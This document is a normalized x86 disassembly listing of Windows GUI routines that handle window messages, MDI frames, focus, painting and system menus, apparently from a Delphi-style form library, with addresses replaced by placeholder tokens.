cmp ebx [ esi ]
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_48a70c
test eax eax
jne r-xdata
push 0x4
push ebx
call GetWindow
cmp eax [ esi ]
jne r-xdata
push 0x0
movzx eax [ esi + 0x4 ]
push eax
push 0xb04a
push ebx
call SendMessageW
sub_47bcf8
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_492e50
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x334 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
setne al
mov [ ebp - 0x10 ] al
lea eax [ ebp - 0x14 ]
push eax
push sub_47bcb4
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebp - 0x4 ]
call sub_47ad68
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x334 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
xor eax eax
push ebp
push sub_47bdde
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x334 ]
mov edx [ ebp - 0x8 ]
call sub_4246e8
mov edx eax
mov eax [ ebp - 0xc ]
call sub_424590
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x334 ]
mov edx [ ebp - 0x8 ]
call sub_4246e8
mov edx [ eax ]
call [ edx + 0xb0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x334 ]
mov edx [ ebp - 0x8 ]
call sub_4246e8
mov dl 0x1
call sub_497e0c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x334 ]
mov edx [ ebp - 0x8 ]
call sub_4246e8
xor edx edx
call sub_497e0c
sub_47be2c
push ebx
mov ebx eax
test [ ebx + 0x374 ] 0x10
je r-xdata
mov eax ebx
call sub_492c54
push 0x0
mov eax ebx
call sub_496868
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x36c ]
push eax
call SendMessageW
jmp r-xdata
xor eax eax
mov [ ebx + 0x36c ] eax
pop ebx
retn
sub_47be70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x36c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_493bd8
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x36c ]
push eax
mov eax ebx
call sub_496868
push eax
call DefFrameProcW
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_496868
push eax
call DefWindowProcW
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_47bed4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_47bf84
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x278 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bf8b
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
test edi edi
je r-xdata
mov [ ebx + 0x278 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x286 ] 0x0
je r-xdata
cmp ebx edi
je r-xdata
mov eax ebx
mov si 0xffaf
call sub_4483f8
mov eax ebx
call sub_47c2a8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
mov dl 0x1
mov eax edi
call sub_476fe4
cmp ebx eax
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb6
call sub_4483f8
test al al
jne r-xdata
sub_47bf94
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x278 ]
mov eax esi
call sub_492284
test al al
je r-xdata
mov edx [ edi + 0x27c ]
mov eax esi
call sub_492284
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_47bed4
mov eax [ esi + 0x30 ]
mov [ edi + 0x27c ] eax
sub_47bfdc
push ebx
push esi
mov esi eax
movzx ebx [ esi + 0x286 ]
mov eax esi
call sub_47bed4
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_47c000
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x5 ] 0x0
inc [ rw-data ]
cmp [ edi + 0x2a8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x5c ] edx
mov eax [ rw-data ]
mov [ eax + 0x60 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_4248a0
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_424768
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x64 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_4248a0
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_424768
jmp r-xdata
xor eax eax
mov [ edi + 0x278 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x278 ] eax
jmp r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_47c27d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x70 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x27c ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x27c ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x27c ] edi
mov eax [ rw-data ]
mov [ eax + 0x70 ] edi
mov eax edi
call sub_496868
mov dx 0xb000
call sub_476d1c
test al al
jne r-xdata
call sub_496868
mov ebx eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x70 ] edx
mov dx 0xb001
mov eax ebx
call sub_476d1c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c284
mov eax [ ebp - 0x4 ]
movzx edx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_448d2c
jmp r-xdata
call sub_448d2c
jmp r-xdata
mov esi [ edi + 0x27c ]
test esi esi
je r-xdata
mov eax [ edi + 0x27c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_492284
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ edi + 0x27c ]
call sub_496868
mov ebx eax
mov eax [ edi + 0x27c ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x27c ] eax
mov dx 0xb01b
mov eax ebx
call sub_476d1c
test al al
jne r-xdata
jmp r-xdata
mov ebx [ esi + 0x30 ]
cmp ebx [ edi + 0x27c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_48f2b0
mov eax [ edi + 0x2cc ]
test eax eax
je r-xdata
test esi esi
je r-xdata
call sub_448d2c
jmp r-xdata
mov esi ebx
mov [ edi + 0x27c ] esi
mov eax esi
call sub_496868
mov dx 0xb01a
call sub_476d1c
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
call sub_448d2c
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_48f2b0
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
sub_47c2a8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x278 ]
test eax eax
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp [ ebx + 0x2a8 ] 0x0
jne r-xdata
mov esi ebx
cmp [ ebx + 0x2a8 ] 0x0
jne r-xdata
mov esi eax
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax esi
call sub_48f2b0
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_496d78
mov esi eax
test esi esi
jne r-xdata
mov eax esi
call sub_496868
push eax
call SetFocus
mov eax esi
call sub_496868
mov ebx eax
call GetFocus
cmp ebx eax
jne r-xdata
mov esi ebx
jmp r-xdata
sub_47c320
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x286 ] bl
mov eax [ esi + 0x2cc ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
movzx ecx bl
mov edx 0xb02b
call sub_48f2b0
pop esi
pop ebx
retn
cmp [ esi + 0x278 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_47c3d4
mov eax esi
call sub_47c2a8
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_496d78
mov edx eax
mov eax esi
call sub_47bed4
sub_47c384
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x286 ] 0x0
je r-xdata
cmp [ ebx + 0x287 ] 0x2
jne r-xdata
cmp [ ebx + 0x278 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_47a6e8
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x278 ]
call sub_48f2b0
mov eax ebx
call sub_47a6e8
mov edx esi
call sub_47c384
sub_47c3d4
push esi
test [ eax + 0x374 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x40 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x40 ]
cmp [ ecx + 0x2a0 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x40 ]
je r-xdata
cmp [ eax + 0x287 ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x40 ]
cmp [ ecx + 0x287 ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x2a0 ]
test dl dl
je r-xdata
cmp [ eax + 0x2a0 ] 0x0
je r-xdata
mov edx esi
call sub_4685d0
mov edx esi
call sub_4685b4
jmp r-xdata
mov ecx [ eax + 0x2a0 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x2a0 ]
cmp [ eax + 0x287 ] 0x1
jne r-xdata
sub_47c47c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_47c4c8
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x278 ]
mov eax 0xb000
call sub_47c47c
cmp [ ebx + 0x2da ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
sub_47c4f8
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x278 ]
mov eax 0xb001
call sub_47c47c
cmp [ ebx + 0x2f2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2f4 ]
call [ ebx + 0x2f0 ]
sub_47c564
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
call sub_46e3b0
xor eax eax
push ebp
push sub_47c750
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
mov edx [ ebp - 0x8 ]
call sub_46e950
xor eax eax
push ebp
push sub_47c72d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47c6e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x364 ]
mov eax ebx
call sub_483fc4
test al al
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x368 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x368 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c6e7
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000002
call sub_46df1c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
mov eax [ eax + 0x14 ]
mov dl 0x5
call sub_46e058
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_46cf24
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
call sub_46e8c8
push eax
call SetBkColor
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
call sub_46e300
push 0x4
call GetStockObject
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
call sub_46e8c8
push eax
call FillRect
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a8 ] 0x0
jne r-xdata
sub_47c6e7
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffa5
call sub_4483f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a8 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c734
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
xor edx edx
call sub_46e950
retn
sub_47c760
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_47a6e8
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_47a71c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
movzx edx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_4483f8
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
movzx edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_495a10
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_47a768
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
movzx edx [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_4483f8
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_47c804
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_496868
call sub_4769b0
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_496868
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_47c548
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_496868
push eax
call EndPaint
movzx eax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_494494
movzx eax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_47c882
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_49789c
cmp [ ebx + 0x2a8 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x2a8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
sub_47c8ac
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x287 ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x287 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x1b8 ]
call sub_46df70
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_47c90c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_496868
call sub_4769b0
test eax eax
jne r-xdata
mov [ esi ] 0x27
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_494888
pop esi
pop ebx
retn
sub_47c954
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x281 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x280 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x287 ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_496868
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x281 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x280 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x280 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_47ca50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2a0 ]
mov eax [ ebp - 0x4 ]
call sub_47ab08
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_47c954
pop ecx
sub_47ca84
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
call sub_4959ec
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_47caa8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_48fd48
cmp [ ebx + 0x8b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_496868
call sub_4769b0
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_496868
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_496868
push eax
call PostMessageW
cmp [ ebx + 0x286 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_48e71c
pop esi
pop ebx
retn
sub_47cb34
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_47ad68
mov ebp eax
mov eax [ edi + 0x334 ]
test eax eax
je r-xdata
cmp [ edi + 0x348 ] 0x0
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
test [ edi + 0x1c ] 0x8
jne r-xdata
mov eax [ edi + 0x348 ]
call sub_47ad68
mov edx edi
call sub_424744
test eax eax
jge r-xdata
inc esi
xor ebx ebx
xor eax eax
mov [ edi + 0x34c ] eax
mov eax edi
mov si 0xffa8
call sub_4483f8
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ edi + 0x348 ]
call sub_47ad40
mov edx edi
call sub_424744
inc eax
jle r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ edi + 0x334 ]
call sub_4246e8
mov edx eax
mov eax ebp
call sub_424744
test eax eax
jge r-xdata
cmp [ edi + 0x2a0 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax edi
call sub_496868
push eax
call SendMessageW
mov eax [ rw-data ]
cmp ebx [ eax + 0x170 ]
je r-xdata
mov eax [ edi + 0x348 ]
call sub_47ad68
mov edx edi
call sub_424590
jmp r-xdata
mov edx ebx
mov eax [ edi + 0x334 ]
call sub_4246e8
call sub_496c14
test al al
je r-xdata
mov edx ebx
mov eax [ edi + 0x334 ]
call sub_4246e8
mov edx eax
mov eax ebp
call sub_424590
mov edx [ esp ]
mov eax edi
call sub_495964
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x287 ] 0x1
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_483ab4
mov [ esp + 0x4 ] eax
mov eax [ edi + 0x24c ]
mov [ esp + 0x8 ] eax
cmp [ edi + 0x34c ] 0x0
setne al
mov [ esp + 0xc ] al
mov eax [ rw-data ]
mov eax [ eax + 0x178 ]
push eax
lea eax [ esp + 0x8 ]
push eax
push 0xb048
push ebx
call SendMessageW
push 0x0
mov eax edi
call sub_496868
push eax
call SetMenu
xor edx edx
mov eax [ edi + 0x2a0 ]
call sub_467f64
sub_47ccc8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4946f4
cmp [ ebx + 0x2a0 ] 0x0
je r-xdata
movzx edx [ esi + 0x4 ]
mov eax [ ebx + 0x2a0 ]
call sub_46768c
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_47cd14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x2a0 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_468250
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_47cd4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_47cde7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x2a0 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cdee
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x2a0 ]
call sub_4675ec
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_483034
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x54 ]
call sub_48aae4
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_483034
jmp r-xdata
sub_47cdf4
push ebx
push esi
mov esi edx
mov ebx eax
push 0xfffffff0
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
and eax 0x40000000
cmp eax 0x40000000
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x287 ] 0x2
jne r-xdata
cmp [ esi + 0x4 ] 0x0
setne dl
mov eax ebx
call sub_47c320
test [ ebx + 0x1c ] 0x10
je r-xdata
sub_47ce38
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
test [ ebx + 0x55 ] 0x20
jne r-xdata
cmp [ ebx + 0x2b8 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov [ ebx + 0x283 ] dl
pop ebx
retn
mov eax [ ebx + 0x2b8 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_47ce94
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_47c384
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_48a798
test eax eax
je r-xdata
cmp [ eax + 0x287 ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x2a0 ] 0x0
je r-xdata
mov edx [ eax + 0x2a0 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_47ceec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x40 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_495844
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_481380
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x283 ] 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
sub_47cf74
push ebx
push esi
mov esi edx
mov ebx eax
